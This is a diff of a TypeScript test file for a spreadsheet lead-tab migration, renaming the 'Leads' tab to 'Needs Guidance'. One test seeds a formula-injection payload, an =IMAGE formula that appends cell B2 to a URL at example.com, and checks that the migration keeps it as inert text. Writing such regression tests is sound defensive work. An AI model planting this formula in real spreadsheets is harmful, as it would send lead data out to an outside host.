@@ -210,9 +210,9 @@ describe('migrating a tab moves every value with its header', () => {
 
   it('migrates every lead tab in one run, with the same number of rows each', () => {
     const h = load();
-    const counts: Record<string, number> = { 'Debt Consolidation': 3, DSCR: 5, FHA: 2, 'Real Estate Investing': 1, Leads: 4 };
+    const counts: Record<string, number> = { 'Debt Consolidation': 3, DSCR: 5, FHA: 2, 'Real Estate Investing': 1, 'Needs Guidance': 4 };
     const olds: Record<string, string[]> = {
-      'Debt Consolidation': OLD.debt, DSCR: OLD.dscr, FHA: OLD.fha, 'Real Estate Investing': OLD.rei, Leads: OLD.leads,
+      'Debt Consolidation': OLD.debt, DSCR: OLD.dscr, FHA: OLD.fha, 'Real Estate Investing': OLD.rei, 'Needs Guidance': OLD.leads,
     };
     for (const [name, n] of Object.entries(counts)) {
       const rows = Array.from({ length: n }, (_, i) => rowFor(olds[name], { Email: `lead${i}@example.com`, Contacted: `c${i}` }));
@@ -247,10 +247,10 @@ describe('migrating a tab moves every value with its header', () => {
     // the same text it read.
     const h = load();
     const attack = '=IMAGE("https://example.com/?"&B2)';
-    h.seed('Leads', [OLD.leads, rowFor(OLD.leads, { 'First Name': attack, Email: 'x@example.com', 'Licensed?': 'No' })]);
+    h.seed('Needs Guidance', [OLD.leads, rowFor(OLD.leads, { 'First Name': attack, Email: 'x@example.com', 'Licensed?': 'No' })]);
     const report = h.gas.migrateLeadTabs().join(' | ');
-    expect(report).toMatch(/Leads: migrated 1 row/);
-    const tab = h.tabs.get('Leads')!;
+    expect(report).toMatch(/Needs Guidance: migrated 1 row/);
+    const tab = h.tabs.get('Needs Guidance')!;
     const value = tab.rows[1][(tab.rows[0] as string[]).indexOf('First Name')];
     expect(value).toBe(attack);
     expect(value).not.toBeInstanceOf(Formula);
